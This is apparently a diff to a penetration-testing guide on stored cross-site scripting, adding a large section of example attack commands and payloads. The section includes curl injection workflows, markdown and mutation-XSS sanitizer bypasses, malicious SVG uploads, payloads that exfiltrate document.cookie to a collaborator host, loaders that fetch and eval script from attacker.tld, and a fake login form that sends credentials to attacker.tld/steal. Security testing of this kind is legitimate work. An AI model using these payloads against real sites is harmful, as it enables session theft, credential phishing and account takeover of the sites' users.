@@ -396,6 +396,109 @@ tester.run_tests(auth_cookies={'session': 'your_session_cookie'})
 
 ---
 
+## Example Commands/Payloads
+
+### Store-then-Verify Workflow (curl)
+
+```bash
+TARGET="https://target.com"
+CANARY="storedxss_$(date +%s)"
+
+# 1. Submit payload to a persistent sink (comment, profile bio, etc.)
+curl -s -X POST "$TARGET/comments" \
+    -d "body=<script>document.title='$CANARY'</script>" \
+    -b "session=<auth_cookie>"
+
+# 2. Re-fetch the page that renders stored data and check for unencoded payload
+curl -s "$TARGET/posts/1" | grep -q "<script>document.title='$CANARY'</script>" && \
+    echo "[VULN] Stored XSS confirmed - payload rendered unencoded"
+
+# 3. Test file-upload based stores (SVG with embedded script)
+cat > poc.svg <<'EOF'
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+EOF
+curl -s -X POST "$TARGET/upload" -F "file=@poc.svg;type=image/svg+xml" -b "session=<auth_cookie>"
+```
+
+### Blind Stored XSS (out-of-band callback)
+
+```bash
+# Register a collaborator/XSS Hunter payload, then inject into any input that
+# an admin/backoffice user might later view (support ticket, log viewer, username, etc.)
+PAYLOAD='"><script src=https://YOUR-SUBDOMAIN.xss.ht></script>'
+curl -s -X POST "$TARGET/support/ticket" -d "subject=Help&body=$PAYLOAD"
+
+# Burp Collaborator variant
+PAYLOAD='<img src=x onerror="fetch(`https://YOUR-ID.burpcollaborator.net/c?`+btoa(document.cookie))">'
+curl -s -X POST "$TARGET/profile" -d "bio=$PAYLOAD" -b "session=<auth_cookie>"
+```
+
+### Automated Scanners
+
+```bash
+# Dalfox in "stored" workflow mode against an authenticated request
+dalfox url "https://target.com/comments" -X POST -d "body=FUZZ" -b "session=<auth_cookie>" --deep-domxss
+
+# XSStrike against the storage endpoint
+python3 xsstrike.py -u "https://target.com/comments" --data "body=test" --skip-dom
+```
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| Payload persists across requests/sessions and renders unencoded on a *different* page load | Confirmed stored XSS |
+| Callback received on collaborator/XSS Hunter domain from an internal/admin IP or User-Agent | Confirmed blind stored XSS reaching a privileged viewer |
+| Uploaded `.svg`/`.html` served with `Content-Type: image/svg+xml` or `text/html` and rendered inline (not as download) | File-upload stored XSS vector |
+
+### Markdown / Rich-Text Editor Bypass (comments, wikis, tickets)
+
+Many stored-XSS sinks are markdown or rich-text renderers, not raw HTML fields — the payload must survive both the markdown parser and any subsequent sanitizer:
+
+```markdown
+[click me](javascript:prompt(document.cookie))
+[click me](j a v a s c r i p t:prompt(document.cookie))
+[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[click me](javascript:window.onerror=alert;throw%201)
+```
+
+### Mutation XSS (mXSS) — bypasses sanitizers that re-parse stored content
+
+Stored content is frequently sanitized on write, then re-inserted into the DOM on read via `innerHTML`; the browser's HTML parser can "mutate" an inert-looking stored fragment into an active one on that second parse (used against DOMPurify in the wild):
+
+```html
+<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
+```
+
+### Persistent Remote-JS Payload (survives length limits / re-triggers on every view)
+
+Instead of storing the whole exploit, store a short `<script src>` pointing at attacker-controlled, updatable JS — useful when the stored field has strict length limits or needs to evolve after the initial injection:
+
+```html
+<script src=//attacker.tld/x.js></script>
+<svg/onload='fetch("//attacker.tld/a").then(r=>r.text().then(t=>eval(t)))'>
+```
+
+### Stored XSS in SVG file upload (via `<use>`/nested SVG so the fetched avatar/thumbnail executes)
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <use xlink:href="#x"/>
+  <symbol id="x"><script>alert(document.domain)</script></symbol>
+</svg>
+```
+
+### Persistent UI Redressing (post-execution — turns a stored payload into a credential-phishing page)
+
+```html
+<script>
+history.replaceState(null, null, '../../../login');
+document.body.innerHTML = "<h1>Please login to continue</h1><form action='https://attacker.tld/steal'>Username: <input name=u>Password: <input type=password name=p></form>";
+</script>
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -466,6 +569,7 @@ element.innerHTML = clean
 - [OWASP Stored XSS](https://owasp.org/www-community/attacks/xss/)
 - [PortSwigger Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
 - [XSS Hunter](https://xsshunter.com/)
+- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 
 
 ---
